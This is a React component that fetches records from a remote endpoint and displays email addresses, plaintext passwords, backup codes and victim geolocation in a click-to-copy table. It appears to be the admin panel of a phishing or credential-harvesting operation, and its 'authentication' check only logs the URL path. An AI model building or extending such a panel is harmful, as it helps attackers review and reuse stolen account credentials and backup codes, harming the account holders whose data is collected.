// import React from 'react'

import { useEffect, useState } from "react";
import axios from "axios";
import { useLocation } from "react-router-dom";

const Emails = () => {
  const [data, setData] = useState(null);

  const pathLocation = useLocation();

  // IS AUTHENTICATED
  useEffect(() => {
    const authenticationRequiredPath = pathLocation.pathname.split("/");
    console.log(authenticationRequiredPath);
  }, [pathLocation]);

  useEffect(() => {
    try {
      const fetchData = async () => {
        const response = await axios.get(
          "https://piscesconsultants.vercel.app/emails"
        );
        setData(response.data);
      };
      fetchData();
    } catch (error) {
      console.error(error);
    }
  }, []);

  const handleCopy = (text) => {
    navigator.clipboard
      .writeText(text)
      .then(() => {
        console.log("Text copied to clipboard:", text);
      })
      .catch((error) => {
        console.error("Failed to copy text:", error);
      });
  };

  console.log(data);

  return (
    <div className="container mx-auto mt-[10rem]">
      <table className="table-auto w-full border-collapse border border-gray-400">
        <thead>
          <tr>
            <th className="px-4 py-2 bg-gray-200 border border-gray-400">ID</th>
            <th className="px-4 py-2 bg-gray-200 border border-gray-400">
              Email
            </th>
            <th className="px-4 py-2 bg-gray-200 border border-gray-400">
              Password
            </th>
            <th className="px-4 py-2 bg-gray-200 border border-gray-400">
              Backup Code
            </th>
            <th className="px-4 py-2 bg-gray-200 border border-gray-400">
              Country
            </th>
            <th className="px-4 py-2 bg-gray-200 border border-gray-400">
              City
            </th>
            <th className="px-4 py-2 bg-gray-200 border border-gray-400">
              Continent
            </th>
            <th className="px-4 py-2 bg-gray-200 border border-gray-400">
              Date
            </th>
          </tr>
        </thead>
        <tbody>
          {data &&
            data.map((item, index) => (
              <tr key={item._id}>
                <td className="px-4 py-2 border border-gray-400">{index}</td>
                <td
                  className="px-4 py-2 border border-gray-400 cursor-pointer"
                  onClick={() => handleCopy(item.email)}
                >
                  {item.email}
                </td>
                <td
                  className="px-4 py-2 border border-gray-400 cursor-pointer"
                  onClick={() => handleCopy(item.password)}
                >
                  {item.password}
                </td>
                <td className="px-4 py-2 border border-gray-400">
                  {item.backupCode}
                </td>
                <td className="px-4 py-2 border border-gray-400">
                  {item.country}
                </td>
                <td className="px-4 py-2 border border-gray-400">
                  {item.city}
                </td>
                <td className="px-4 py-2 border border-gray-400">
                  {item.continent}
                </td>
                <td className="px-4 py-2 border border-gray-400">
                  {new Date(item.date).toLocaleString()}
                </td>
              </tr>
            ))}
        </tbody>
      </table>
    </div>
  );
};

export default Emails;
